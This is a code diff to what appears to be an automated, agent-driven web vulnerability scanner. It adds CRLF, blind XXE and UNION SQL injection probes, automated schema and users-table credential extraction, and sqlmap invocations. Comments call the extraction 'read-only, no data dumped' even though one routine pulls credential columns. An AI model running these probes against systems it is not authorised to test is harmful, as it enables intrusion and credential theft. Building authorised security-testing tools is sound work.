-                                             "family": "crlf", "tags": ["crlf", "response-splitting"]})
+                            _crlf = {"title": f"CRLF / response-header injection on '{probe.parameter}'",
+                                     "severity": v["severity"].lower(), "target": probe.url,
+                                     "description": v["detail"],
+                                     "evidence": f"the injected marker '{ws.CRLF_MARKER}' surfaced as a distinct RESPONSE HEADER",
+                                     "impact": ("Attacker-controlled response headers enable web cache poisoning (serving a "
+                                                "malicious page to other visitors), Set-Cookie injection/fixation, and "
+                                                "redirect/phishing under the trusted domain."),
+                                     "confidence": "confirmed", "cwe": "CWE-113",
+                                     "family": "crlf", "tags": ["crlf", "response-splitting"],
+                                     "reproduction_steps": [
+                                         f"Send the request below (an encoded CR/LF + marker header injected into '{probe.parameter}').",
+                                         f"Read the RESPONSE headers (curl -i) and confirm a distinct '{ws.CRLF_MARKER}' header is present.",
+                                         "Repeat without the CR/LF payload and confirm the header disappears (rules out reflection)."],
+                                     "false_positive_check": (f"The '{ws.CRLF_MARKER}' value appears as a real, separate response HEADER "
+                                                              "(not in the body), so the injected CR/LF actually split the header stream.")}
+                            findings.append(self._attach_poc(_crlf, probe.url, cl))
                             break
                     except Exception:
                         pass
@@ -2486,10 +3654,127 @@ class ToolRegistry:
                 if inter:
                     findings.append(xxe.oob_finding(url, purl, inter))
                 collab.clear(token)
+            # 3) timing-based blind XXE → SSRF: an external SYSTEM entity pointed at a
+            # black-hole host stalls the response (the server made the outbound request).
+            # Non-destructive — the target is a reserved TEST-NET IP that routes nowhere.
+            if not any(f.get("confidence") == "confirmed" for f in findings):
+                import time as _time
+
+                async def _timed(body: str, to: float = 12.0) -> float:
+                    t0 = _time.perf_counter()
+                    try:
+                        await c.post(url, headers=headers, content=body.encode(),
+                                     timeout=httpx.Timeout(to))
+                    except Exception:
+                        pass
+                    return _time.perf_counter() - t0
+
+                import statistics as _stats
+                base_body = sample or "<data><productId>1</productId><storeId>1</storeId></data>"
+                base_samples = [await _timed(base_body) for _ in range(3)]   # 3 benign baselines
+                baseline = min(base_samples)
+                blackhole = "http://192.0.2.1:9/"          # TEST-NET-1 (RFC5737), unroutable → connect hang
+                # Two entity forms — try both so a parser that blocks one is still probed:
+                #   • general entity referenced inside an element (&xxe;) — this is accepted
+                #     even when the parser rejects parameter entities ("Entities are not
+                #     allowed for security reasons"), the common hardened default;
+                #   • parameter entity in the internal subset — for parsers that allow those.
+                stall_body, stall_kind, stall_samples = None, "", []
+                for kind, body in (("general entity (&xxe; in element)", xxe.build_inband_xml(blackhole, sample)),
+                                   ("parameter entity (internal subset)", xxe.build_oob_xml(blackhole, sample))):
+                    d0 = await _timed(body)
+                    if baseline < 1.8 and (d0 - baseline) > 3.0:
+                        # repeat twice more so the stall is proven consistent, not a blip
+                        stall_samples = [d0] + [await _timed(body) for _ in range(2)]
+                        stall_body, stall_kind = body, kind
+                        break
+                if stall_body is not None:
+                    _mb, _ms = _stats.median(base_samples), _stats.median(stall_samples)
+                    _tbl = ("| Sample | Baseline (benign body) | External-entity payload |\n"
+                            "|---|---|---|\n"
+                            + "\n".join(f"| {i + 1} | {b:.2f}s | {s:.2f}s |"
+                                        for i, (b, s) in enumerate(zip(base_samples, stall_samples)))
+                            + f"\n| median | {_mb:.2f}s | {_ms:.2f}s |")
+                    findings.append(self._attach_poc({
+                        "severity": "high", "cwe": "CWE-611", "target": url, "content_type": ctype,
+                        "title": "Blind XXE -> SSRF (external entity dereference, timing-confirmed)",
+                        "confidence": "confirmed", "family": "xxe", "tags": ["xxe", "ssrf", "blind"],
+                        "description": (
+                            f"A POST XML body (Content-Type: {ctype}) declaring an external SYSTEM entity "
+                            f"({stall_kind}) pointed at an unreachable black-hole host (192.0.2.1:9 — TEST-NET-1, "
+                            "reserved and unroutable) makes the server's XML parser attempt an OUTBOUND request while "
+                            "parsing. The benign baseline body returns immediately; the external-entity body stalls on "
+                            "the connect timeout every time. That the delay tracks the entity (and nothing else in the "
+                            "body changes) proves the parser dereferenced attacker-controlled external entities — a "
+                            "server-side request forgery primitive. Non-destructive: the target IP routes nowhere."),
+                        "evidence": (f"External SYSTEM entity ({stall_kind}) -> unreachable host. Median baseline "
+                                     f"{_mb:.2f}s vs median external-entity {_ms:.2f}s (delta {_ms - _mb:.2f}s), "
+                                     f"consistent across 3 samples each."),
+                        "impact": ("The server can be coerced into outbound requests (SSRF) to internal-only services "
+                                   "or cloud metadata (169.254.169.254); with a reachable collaborator the response "
+                                   "can be exfiltrated, and file:// entities may read local files depending on parser "
+                                   "config."),
+                        "false_positive_check": (
+                            f"Three benign baselines ({', '.join(f'{b:.2f}s' for b in base_samples)}) are all fast; "
+                            f"three external-entity requests ({', '.join(f'{s:.2f}s' for s in stall_samples)}) are all "
+                            "stalled by ~5s (the OS connect timeout to the black-hole). The ONLY difference between the "
+                            "two bodies is the SYSTEM entity, so the entity fetch is the isolated cause. One slow "
+                            "sample could be a network blip; three consistent stalls against three fast baselines "
+                            "cannot be."),
+                        "baseline": f"POST {url}\nContent-Type: {ctype}\n\n{base_body}",
+                        "timing": _tbl,
+                    }, url, None, method="POST", body=stall_body))
         if self.mission_id and findings:
             await self._http(url, "POST", {"Content-Type": ctype}, body=sample or "<root/>", capture=True)
         conf = sum(1 for f in findings if f.get("confidence") == "confirmed")
         return ToolResult("xxe", url, True, f"{len(findings)} XXE signal(s), {conf} confirmed", findings)
+
+    async def _sqli_union(self, c, get, url: str, p: str, orig: str):
+        """Escalate a CONFIRMED reflected SQLi into a UNION data extraction (read-only).
+        Discovers the injection context (the closing that balances the query + the column
+        count) by marker reflection, then dumps the DB catalogue and a users-like table.
+        Nothing target-specific is hardcoded; bounded and scope-guarded. Returns
+        {finding, req, resp} or None."""
+        import sqli_tool as sqli
+        # 1) discover (closing, ncols) — stop at the first reflected marker
+        ctx = None
+        for closing in sqli.UNION_CLOSINGS:
+            for ncols in range(1, 11):
+                r, _ = await get(c, xt.set_param(url, p, sqli.union_count_probe(orig, closing, ncols)))
+                if r is not None and sqli.union_hit(r.text):
+                    ctx = (closing, ncols)
+                    break
+            if ctx:
+                break
+        if not ctx:
+            return None
+        closing, ncols = ctx
+        # 2) dump the schema (sqlite catalogue, then information_schema)
+        schema = ""
+        for expr in sqli.schema_exprs():
+            r, _ = await get(c, xt.set_param(url, p, sqli.union_extract_probe(orig, closing, ncols, expr)))
+            if r is not None and ("CREATE TABLE" in r.text or "~~" in r.text):
+                schema = r.text
+                break
+        tables = sqli.parse_tables(schema)
+        # 3) dump a users-like table's identifier + secret columns
+        creds, last_r, last_req = [], None, None
+        ut = sqli.parse_users_table(schema)
+        if ut:
+            cols = sqli.parse_columns(schema, ut)
+            req = xt.set_param(url, p, sqli.union_extract_probe(orig, closing, ncols, sqli.creds_expr(ut, cols)))
+            r, _ = await get(c, req)
+            if r is not None:
+                creds = sqli.parse_creds(r.text)
+                last_r, last_req = r, req
+        if not tables and not creds:
+            return None
+        req = last_req or xt.set_param(url, p, sqli.union_count_probe(orig, closing, ncols))
+        self.state.add_capability(self._Capability.DATABASE_READ, f"UNION SQLi read {len(tables)} table(s) via '{p}'")
+        if creds:
+            self.state.add_capability(self._Capability.PASSWORD_HASH_OBTAINED, f"{len(creds)} credential(s) extracted")
+        return {"finding": sqli.union_finding(url, p, ncols, closing, tables, creds),
+                "req": req, "resp": last_r}
 
     async def _run_sqli(self, inp: dict) -> ToolResult:
         import time
@@ -2520,6 +3805,7 @@ class ToolRegistry:
             base_r, _ = await get(c, url)
             base_body = base_r.text if base_r is not None else ""
             base_status = base_r.status_code if base_r is not None else 0
+            union_done = False   # UNION escalation runs at most once per call (bounded)
             for p in params:
                 orig = qvals.get(p, "1")
                 confirmed = False
@@ -2545,6 +3831,17 @@ class ToolRegistry:
                         findings.append(self._attach_poc(sqli.quote_recovery_finding(
                             url, p, base_status, r_sq.status_code, r_dq.status_code), _req, r_sq))
                         ev.append(_req); confirmed = True
+                # 1c) ESCALATE a confirmed reflected injection into proof-by-data: a UNION
+                #     SELECT that balances the query and reads out the schema + a users
+                #     table. Runs at most once per call (the first reflected confirmation),
+                #     read-only, scope-guarded — this is what turns "injection present"
+                #     into "here is the data it leaks" (and auto-solves data-exfil goals).
+                if confirmed and not union_done:
+                    union_done = True
+                    uf = await self._sqli_union(c, get, url, p, orig)
+                    if uf:
+                        findings.append(self._attach_poc(uf["finding"], uf["req"], uf["resp"]))
+                        ev.append(uf["req"])
                 if confirmed:
                     continue
                 # 2) boolean-based blind
@@ -2577,8 +3874,170 @@ class ToolRegistry:
 
         if self.mission_id and ev:
             await self._http(ev[0], "GET", capture=True)
+        # DB-METADATA ENRICHMENT: a CONFIRMED native SQLi gets read-only DB proof
+        # (version/current user/schema/database) attached — data-plane depth on the exact
+        # injectable endpoint, WITHOUT the deep planner-wide sqlmap fan-out. deep/insane only.
+        # Native UNION extraction first (deterministic, reliable); sqlmap as the fallback for
+        # non-UNION (boolean/time-based) injections. Both are strictly read-only.
+        if findings and getattr(self, "intensity", "standard") in ("deep", "insane"):
+            _tgt = findings[0].get("target") or url
+            proof, settings = await self._sqli_db_metadata(_tgt)
+            if not proof:
+                proof, settings = await self._sqlmap_enrich(_tgt)
+            if proof:
+                findings[0]["evidence"] = ((findings[0].get("evidence") or "")
+                                           + "\n\nDatabase access (read-only — no data dumped): " + proof).strip()
+                findings[0]["database_proof"] = proof
+                findings[0]["severity"] = "critical"          # data-plane access confirmed
+                findings[0]["settings"] = ((findings[0].get("settings") or "sqli oracle")
+                                           + " ; enrich: " + settings).strip(" ;")
         return ToolResult("sqli", url, True,
                           f"tested {len(params)} param(s), {len(findings)} confirmed SQLi", findings)
+
+    async def _sqlmap_enrich(self, url: str) -> tuple:
+        """Read-only DB-metadata extraction for a CONFIRMED SQLi: run sqlmap on the exact
+        injectable URL and pull whatever it proves — injection techniques, back-end DBMS
+        (confirmed or heuristic), banner, current user/db, database names. NEVER --dump
+        (no data theft). Attaches what actually landed, never fabricates. Returns
+        (proof_string, settings) or ('', '')."""
+        import re as _re
+        cmd = ["sqlmap", "-u", url, "--batch", "--flush-session", "--random-agent",
+               "--technique", "BEU", "--level", "3", "--risk", "2",
+               "--current-user", "--current-db", "--banner", "--dbs"]
+        _hdrs = self.session_headers or {}
+        _ck = _hdrs.get("Cookie") or _hdrs.get("cookie")
+        if _ck:
+            cmd += ["--cookie", _ck]
+        out, err = await self._cmd(cmd, timeout=420)
+        if err.startswith("__MISSING__") or (
+                "is vulnerable" not in out and "sqlmap identified" not in out and "the following injection" not in out):
+            return "", ""
+        proof = _parse_sqlmap_proof(out)                 # parameter, techniques, payloads, DBMS
+        parts = []
+        dbms = proof.get("dbms") or ""
+        if not dbms:
+            h = _re.search(r"back-end DBMS could be '([^']+)'", out)
+            if h:
+                dbms = h.group(1).strip() + " (heuristic)"
+        if dbms:
+            parts.append(f"DBMS={dbms}")
+        for lbl, key in (("banner", "banner"), ("current user", "current_user"),
+                         ("current database", "current_db")):
+            m = _re.search(lbl + r":\s*'([^'\n\r]+)'", out)
+            if m:
+                parts.append(f"{key}={m.group(1).strip()}")
+        mdb = _re.search(r"available databases \[\d+\]:\s*((?:\s*\[\*\][^\n]+\n?)+)", out)
+        if mdb:
+            names = [n.strip() for n in _re.findall(r"\[\*\]\s*([^\n\r]+)", mdb.group(1))]
+            if names:
+                parts.append("databases=" + ",".join(names[:8]))
+        if proof.get("types"):
+            parts.append("techniques=" + "; ".join(proof["types"][:4]))
+        settings = " ".join(cmd[3:])
+        if not parts:
+            return ("sqlmap independently confirmed the injection point (read-only)", settings)
+        return " | ".join(parts), settings
+
+    async def _sqli_db_metadata(self, url: str) -> tuple:
+        """Native UNION-based read-only DB-metadata extraction for a CONFIRMED SQLi.
+        Reflects DB version / current user / current schema / database through the
+        vulnerable UNION column and reads them back — SELECT-only, never touches user
+        tables, never writes. The marker is assembled by the DB from CHAR() codes (so it
+        is ABSENT from the request text), and a 2+2=4 sanity check proves the value came
+        from SQL EXECUTION, not input reflection. Deterministic and far more reliable
+        than a DBMS fingerprint. Returns (proof, settings) or ('', ''). Non-destructive."""
+        import httpx
+        from urllib.parse import parse_qsl
+        params = xt.params_of(url)
+        if not params:
+            return "", ""
+        qvals = dict(parse_qsl(urlparse(url).query, keep_blank_values=True))
+        headers = {"User-Agent": _UA, **(self.session_headers or {})}
+
+        def _chars(tag):
+            return [f"CHAR({ord(ch)})" for ch in tag]
+
+        def marker(tag, mode):                        # DB-assembled token (not in the request text)
+            cc = _chars(tag)
+            return "||".join(cc) if mode == "pipe" else "CONCAT(" + ",".join(cc) + ")"
+
+        def concat3(a, mid, b, mode):
+            return f"{a}||{mid}||{b}" if mode == "pipe" else f"CONCAT({a},{mid},{b})"
+
+        def cast(fn, mode):
+            return f"CAST(({fn}) AS {'VARCHAR' if mode == 'pipe' else 'CHAR'})"
+
+        def unhtml(s):
+            return (s.replace("&apos;", "'").replace("&quot;", '"')
+                     .replace("&amp;", "&").replace("&#39;", "'"))
+
+        async with httpx.AsyncClient(verify=False, follow_redirects=True,
+                                     headers=headers, timeout=25) as c:
+            async def q(p, payload):
+                t = xt.set_param(url, p, payload)
+                if not self.scope.validate(t)[0]:
+                    return 0, ""
+                try:
+                    r = await c.get(t)
+                    return r.status_code, r.text
+                except Exception:
+                    return 0, ""
+
+            for p in params[:3]:
+                orig = qvals.get(p, "1") or "1"
+                for mode in ("pipe", "concat"):        # || (H2/PG/Oracle/SQLite) then CONCAT() (MySQL)
+                    # ── column count: a well-formed UNION SELECT NULL×n stops erroring ──
+                    widths = []
+                    for n in range(1, 14):
+                        st, _ = await q(p, f"{orig}' UNION ALL SELECT {','.join(['NULL'] * n)}-- -")
+                        if st and st < 400:
+                            widths.append(n)
+                    # ── reflected column: CHAR-marker per position (numeric cols reject it) ──
+                    found = None
+                    for n in widths[:4]:
+                        for pos in range(n):
+                            tag = f"QZ{chr(65 + pos)}7"
+                            row = ["NULL"] * n
+                            row[pos] = marker(tag, mode)
+                            _, body = await q(p, f"{orig}' UNION ALL SELECT {','.join(row)}-- -")
+                            if body and tag in unhtml(body):
+                                found = (n, pos)
+                                break
+                        if found:
+                            break
+                    if not found:
+                        continue
+                    n, pos = found
+                    B = marker("QZX7", mode)           # boundary the DB assembles around each value
+
+                    async def extract(fn):
+                        row = ["NULL"] * n
+                        row[pos] = concat3(B, cast(fn, mode), B, mode)
+                        _, body = await q(p, f"{orig}' UNION ALL SELECT {','.join(row)}-- -")
+                        if not body:
+                            return None
+                        m = re.search(r"QZX7(.*?)QZX7", unhtml(body), re.S)
+                        v = m.group(1).strip() if m else None
+                        return v if (v and 0 < len(v) < 256 and v.upper() != "NULL") else None
+
+                    if await extract("2+2") != "4":     # DB isn't evaluating here -> wrong point/mode
+                        continue
+                    fields = (("version", ("H2VERSION()", "VERSION()", "version()", "@@VERSION")),
+                              ("current user", ("CURRENT_USER", "CURRENT_USER()", "USER()", "SYSTEM_USER", "USER")),
+                              ("current schema", ("SCHEMA()", "CURRENT_SCHEMA", "CURRENT_SCHEMA()")),
+                              ("database", ("DATABASE()", "CURRENT_CATALOG", "DB_NAME()")))
+                    parts = []
+                    for label, cands in fields:
+                        for fn in cands:
+                            v = await extract(fn)
+                            if v:
+                                parts.append(f"{label}={v}")
+                                break
+                    if parts:
+                        settings = (f"native UNION extraction via '{p}' "
+                                    f"({n} columns, reflected column {pos + 1}, {mode} concat)")
+                        return " | ".join(parts), settings
+        return "", ""
 
     async def _run_auth_sqli(self, inp: dict) -> ToolResult:
         """POST/JSON body auth-bypass SQLi on a login-style endpoint — the injection
@@ -3013,12 +4472,19 @@ class ToolRegistry:
             return ToolResult("zap", url, True,
                               "ZAP not configured — enable with: docker compose --profile zap up -d "
                               "and set ZAP_ADDR=http://zap:8090", [])
-        zap = zc.ZapClient()
+        # 120s per-call timeout: under a heavy thorough/demon scan the ZAP API (esp.
+        # /alerts and status polls) is slow; the 30s default read-timed-out and, since
+        # httpx ReadTimeout stringifies to '', surfaced as a blank "ZAP scan error:".
+        zap = zc.ZapClient(timeout=120)
         try:
             await zap.version()
         except Exception as e:
             return ToolResult("zap", url, False, "", [], f"ZAP daemon unreachable at ZAP_ADDR: {e}")
 
+        # DEF-2 guard: clear any orphaned scans from an earlier/killed mission so this
+        # run starts against a fresh, responsive daemon (a still-running prior scan
+        # otherwise overloads the shared ZAP and its API read-times-out).
+        await zap.stop_all()
         name = f"bbh-{self.mission_id or 'x'}-{os.urandom(2).hex()}"
         try:
             ctx_id = await zap.new_context(name)
@@ -3037,6 +4503,7 @@ class ToolRegistry:
             policy = (inp.get("policy") or getattr(self, "zap_policy", "safe_active"))
             if policy not in ("passive", "safe_active", "thorough_active"):
                 policy = "safe_active"
+            ascan_err = ""      # set if the active scan degrades but passive alerts survive
             # spider -> ajax spider (SPA) — always run (feeds the passive scanner too)
             sid = await zap.spider(url, context=name)
             if sid is not None:
@@ -3083,13 +4550,19 @@ class ToolRegistry:
                         await setup
                     except Exception:
                         pass
-                asid = await zap.ascan(url, context_id=ctx_id, policy=inp.get("scan_policy") or None)
-                if asid is not None:
-                    cap = int(inp.get("scan_seconds", cap_override or (300 if policy == "safe_active" else 600)))
-                    await zap.wait_int(lambda: zap.ascan_status(asid), cap=cap, stop_event=self.stop_event)
+                # Active scan in its OWN try: if it errors or times out (common with
+                # thorough_active on a slow live target), keep the passive alerts already
+                # gathered rather than discarding the whole ZAP result.
+                try:
+                    asid = await zap.ascan(url, context_id=ctx_id, policy=inp.get("scan_policy") or None)
+                    if asid is not None:
+                        cap = int(inp.get("scan_seconds", cap_override or (300 if policy == "safe_active" else 600)))
+                        await zap.wait_int(lambda: zap.ascan_status(asid), cap=cap, stop_event=self.stop_event)
+                except Exception as _ae:
+                    ascan_err = f"{type(_ae).__name__}: {_ae}".strip(": ")
             raw = zc.dedup_alerts(await zap.alerts(baseurl=f"{base.scheme}://{base.netloc}"))
         except Exception as e:
-            return ToolResult("zap", url, False, "", [], f"ZAP scan error: {e}")
+            return ToolResult("zap", url, False, "", [], f"ZAP scan error: {type(e).__name__}: {e}".strip(": "))
 
         findings = [zc.alert_to_finding(a) for a in raw]
         findings = [f for f in findings if f["severity"] in ("critical", "high", "medium", "low")]
@@ -3104,9 +4577,10 @@ class ToolRegistry:
         else:
             _dials = (f"speed={inp.get('speed') or getattr(self, 'zap_speed', 'normal')}; "
                       f"aggression={inp.get('aggression') or getattr(self, 'zap_aggression', 'normal')}")
+        _degraded = f" [active scan degraded, passive alerts kept: {ascan_err}]" if ascan_err else ""
         return ToolResult("zap", url, True,
                           f"policy={policy}; {_dials}; {len(findings)} ZAP alert(s) "
-                          f"[{_plabel}] (from {len(raw)} raw)", findings)
+                          f"[{_plabel}] (from {len(raw)} raw){_degraded}", findings)
 
     async def _run_dalfox(self, inp: dict) -> ToolResult:
         url = inp["url"]
@@ -3145,8 +4619,13 @@ class ToolRegistry:
         # standard L1R1 (fast); deep L3R2 + all techniques; insane L5R3 + all
         # techniques + read-only proof enumeration (names the DBs/user the injection
         # exposes — no writes, no data dumps). Timeout grows so heavy runs finish.
+        # sqlmap here is CORROBORATION — the native _sqli_db_metadata extractor already
+        # confirms the injection and pulls DBMS/user/db in seconds, so a 30-min-per-call
+        # insane budget only stalls the run (9 endpoints x 30min = a multi-hour tail that
+        # never reaches "complete"). Bound insane to 10 min/call: sqlmap still finds a real
+        # injection well inside that, and the run stays completable.
         level, risk, timeout = {
-            "standard": (1, 1, 420), "deep": (3, 2, 420), "insane": (5, 3, 1800),
+            "standard": (1, 1, 420), "deep": (3, 2, 420), "insane": (5, 3, 600),
         }.get(intensity, (1, 1, 420))
         cmd = ["sqlmap", "-u", url, "--batch", "--level", str(level), "--risk", str(risk),
                "--flush-session", "--random-agent"]
@@ -3222,7 +4701,21 @@ class ToolRegistry:
         return ToolResult("generate_playbook", self.recon.get("target", ""), True,
                           f"{stats['total']} test playbooks generated", slim)
 
+    # Access-control / business-logic classes cannot be visually confirmed — a model may
+    # only mark them CONFIRMED with request/response evidence. Without it, demote to a lead.
+    _ORACLE_FAMILIES = ("idor", "bola", "bfla", "authz", "access-control", "access_control",
+                        "business_logic", "broken_access")
+
     async def _store_finding(self, inp: dict) -> ToolResult:
+        fam = (inp.get("family") or "").lower()
+        conf = (inp.get("confidence") or "").lower()
+        if fam in self._ORACLE_FAMILIES and conf in ("confirmed", "", "high"):
+            has_evidence = bool(str(inp.get("evidence") or "").strip()) and bool(inp.get("reproduction_steps"))
+            if not has_evidence:
+                inp["confidence"] = "lead"
+                inp["analyst_notes"] = ((inp.get("analyst_notes") or "") +
+                                        " [demoted to lead: access-control/business-logic findings require captured "
+                                        "request/response evidence — confirm with confirm_idor or an http_diff oracle]").strip()
         if self.mission_id:
             # Dedup against what auto-store already recorded (shared fingerprint set from
             # the agent). A proof-based finding auto-store already landed must not be
